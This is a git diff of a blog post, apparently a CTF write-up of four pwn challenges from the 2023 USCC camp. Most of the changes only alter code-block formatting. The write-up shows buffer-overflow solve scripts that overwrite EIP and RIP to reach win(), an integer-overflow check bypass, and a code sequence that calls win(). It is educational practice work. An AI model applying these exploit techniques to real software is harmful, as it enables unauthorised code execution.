@@ -1,7 +1,7 @@
 ---
 title: "2023 USCC Camp CTF"
 date: 2023-06-09T17:59:44-05:00
-tags: ['pwn']
+tags: ['writeup', 'pwn']
 ---
 
 ## Preface
@@ -63,9 +63,9 @@ Well, we can see that the function `fgets()` is being called, allowing us to inp
 Our goal here is to overwrite the **EIP** register to point to the address of the `win()` function, so let's take a look how...
 - - -
 First, we can start off with the assumed buffer size of `fgets()` by taking a look at a piece of this assembly code...
-```nasm
+{{< highlight nasm nasm >}}
 lea    eax,[ebp-0x26]
-```
+{{< /highlight >}}
 `0x26` to decimal is 32, so we'll start off by sending 32 A's.
 
 ![Output of the program within gdb and sending 32 A's](baby-bof-86-sending-a.png)
@@ -80,17 +80,17 @@ Looks like sending 46 A's succesfully overwrote the **EIP** register, but becaus
 For this, we can utilize the [`pwntools`](https://github.com/Gallopsled/pwntools) package.
 
 Let's take what we know so far and put into a python script
-```py
+{{< highlight py solve.py >}}
 from pwn import * # Import everything from the package
 
 io = process('./baby-bof-x86') # Create a process of the program
 
 offset = 42 # Offset discovered via gdb
 payload = b"A"*offset # Our A's encoded into bytes.
-```
+{{< /highlight >}}
 Remember how we saw the address of the `win()` function when we ran the program? We can use that and append it to our payload which should hopefully set the **EIP** register to it.
 
-```py
+{{< highlight py solve.py >}}
 from pwn import * # Import everything from the package
 
 io = process('./baby-bof-x86') # Create a process of the program
@@ -98,13 +98,13 @@ io = process('./baby-bof-x86') # Create a process of the program
 offset = 42 # Offset discovered via gdb
 payload = b"A"*offset # Our A's encoded into bytes.
 payload += p32(0x80485c6) # b'\xc6\x85\x04\x08'
-```
+{{< /highlight >}}
 
 By using the `p32()` function from pwntools, we can interpret the memory address into bytes without needing to use the built-in `struct` module.
 
 Now that we have our payload ready, we need to send it.
 
-```py
+{{< highlight py solve.py >}}
 from pwn import * # Import everything from the package
 
 io = process('./baby-bof-x86') # Create a process of the program
@@ -116,7 +116,7 @@ payload += p32(0x80485c6) # b'\xc6\x85\x04\x08'
 io.sendline(payload) # Sends our payload to the program, similar to running the program manually and typing "screaming goes here"
 
 io.interactive() # Allows us to see the program run
-```
+{{< /highlight >}}
 
 Now we can run our script and hope that it works.
 
@@ -163,7 +163,7 @@ According to *Red Team Notes*, the reason for the **RIP** register not overflowi
 #### Reaching the `win()` function
 By utilizing `pwntools` again, we can automatically find our offset as well as retrieve the address of the `win()` function.
 
-```py
+{{< highlight py solve.py >}}
 from pwn import *
 
 ### Finding our offset ###
@@ -199,7 +199,7 @@ payload += p64(int(win, 16))
 # Send our payload
 io.sendline(payload)
 io.interactive()
-```
+{{< /highlight >}}
 
 ### 3) ZeroTrust™
 A 'new' way to authenticate...  
@@ -211,7 +211,7 @@ Right off the start, we are given the address of the `win()` function again, sav
 Running gdb on the program showed interesting similarities between the binary that we just did, [:baby: BOF 64](#2--bof-64)... Hm, let's try to send the same script with some minor tweaks to adjust to the output of the program.
 
 #### Reaching the `win()` function
-```py
+{{< highlight py solve.py >}}
 from pwn import *
 
 ### Finding our offset ###
@@ -255,7 +255,7 @@ payload += p64(int(win, 16))
 # Send our payload
 io.sendline(payload)
 io.interactive()
-```
+{{< /highlight >}}
 And voila, we should have our flag.
 
 ### 4) Y2K :bomb:
@@ -265,22 +265,22 @@ This challenge was the one that got me and unfortunately I solved it after the C
 
 #### Running the program
 This time we aren't given any address, so maybe we need to find it, or there's a way to call it within the program.
-```
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 2023
 2023
 Cool! good to know...
-```
+{{< /highlight >}}
 > *Sending a value equal to or greater than 2022 gives us "Cool! good to know..."*
 
-```
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 2021
 2021
 That was a long time ago...
-```
+{{< /highlight >}}
 > *Sending a value under 2022 gives us "That was a long time ago..."*
 
 #### Debugging the program
@@ -288,7 +288,7 @@ After viewing the functions in the program, it's pretty difficult to determine w
 
 We can start off by looking at `main()` and get a clue of how the program initially begins.
 
-```c
+{{< highlight c c >}}
 undefined8 main(void)
 
 {
@@ -307,12 +307,12 @@ undefined8 main(void)
   }
   return 0;
 }
-```
+{{< /highlight >}}
 > *Here you might see some different variable names. I changed them throughout the decompiled source to what I thought best matched its purpose to make debugging a bit easier.*
 
 The `main()` function calls `year_check()` which seems to return an integer and for us to reach `complex_calculation()`, we need it to **not** equal to 0, so let's go ahead and take a look at it.
 
-```c
+{{< highlight c c >}}
 undefined8 year_check(void)
 
 {
@@ -337,7 +337,7 @@ undefined8 year_check(void)
   }
   return result;
 }
-```
+{{< /highlight >}}
 
 Looking at the decompiled code, in order to have the function **return 1** we must get the year equal to 200, yet the first IF statement checks if our year is less than 2022. This is a problem since 2000 is less than 2022 :exploding_head:.
 
@@ -351,30 +351,31 @@ INT_MAX|2147483647
 Alright it's time to do some math. Lucky for us the program returns the number we typed in so we can use that to reflect upon our input.
 
 Sending `SHRT_MAX+1`, the max value for the `short` type, returns `-32768`, this is known as an [**arithmetic overflow**](https://stackoverflow.com/questions/6360049/what-are-arithmetic-underflow-and-overflow-in-c). This is great news since we know something is acting up now.
-```
+
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 32768
 -1
 Cool! good to know...
-```
+{{< /highlight >}}
 Also if you haven't noticed, we got *"Cool! good to know..."*, meaning we were able to get pass the first IF statement.
 
 So the question still remains, how can we satisfy the second IF statement and where is the math I said we were going to do? Well, we need to stay under `INT_MAX+1` to not satisfy the first IF statement, but also satisfy the second IF statement by manipulating the `short` year.
 
 Let's try to add 2000 to `SHRT_MAX+1`.
-```
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 34768
 -30768
 Cool! good to know...
-```
+{{< /highlight >}}
 
 Looks like that didn't work. After doing some [research](https://stackoverflow.com/questions/3108022/incrementing-an-integer-value-beyond-its-integer-limit-c-sharp), it looks like it wraps back around to its minimum value. Well after fidgeting around with the number, I eventually found a way to get the program to read in `2000`.
 
 Initially I appended `2000` to `SHRT_MAX+1`, which ended up actually working.
-```
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 327682000
@@ -383,10 +384,10 @@ Which year is it?
 
 Access granted!
 ...
-```
+{{< /highlight >}}
 
 I also figured out by multiplying `SHRT_MAX+1` by `2`, then adding `2000`, also gives the same result.
-```
+{{< highlight zsh zsh >}}
 ...
 Which year is it?
 > 67536
@@ -395,11 +396,11 @@ Which year is it?
 
 Access granted!
 ...
-```
+{{< /highlight >}}
 
 Now that we were able to get `year_check()` to return `1`, let's return to the decompiled code and take a look at `complex_calculation()`.
 
-```c
+{{< highlight c c >}}
 void complex_calculation(void)
 
 {
@@ -467,7 +468,7 @@ void complex_calculation(void)
   }
   return;
 }
-```
+{{< /highlight >}}
 > *A lot is happening here, but don't fret, we can take a look at this code step by step.*
 
 Here we have a **while loop** which constraints us from sending more than 7 codes and the **switch statement** determines what each code does, not too bad. Now what looks the most intimidating is the code in each **case**.
@@ -504,11 +505,11 @@ Adds `0x2` to `rbx`
 
 Now that we understood what each digit does, how can we figure out the code here? I pointed out that [case 5](#case-5) called a function at `rbx`. Well we do have a `win()` function, so let's grab the address of that.
 
-```
+{{< highlight zsh zsh >}}
 gdb ./y2k
 > p win
 $1 = {<text variable, no debug info>} 0x401276 <win>
-```
+{{< /highlight >}}
 
 Okay, now that we got the address, let's find out how we can set `rbx` to `0x401276` and call it.
 
@@ -519,7 +520,7 @@ We still need `0x6` more bytes. Luckily, we've only used **2/7** of our digits. 
 Now there's only one more thing to do, call `win()`! All we need is to go to [case 5](#case-5) and that should be it.
 
 #### Solve Script
-```py
+{{< highlight py solve.py >}}
 from pwn import *
 
 p = process('./y2k')
@@ -536,7 +537,7 @@ p.sendline(b'9')
 p.sendline(b'5')
 
 p.interactive()
-```
+{{< /highlight >}}
 
 ## Conclusion
 The USCC camp was a great experience and was an opportunity I'm glad that I took advantage of. Again, I'd like to thank those responsible for the USCC, its partners, and the BisonSquad Team, especially the pwn challenge creator :grin:.
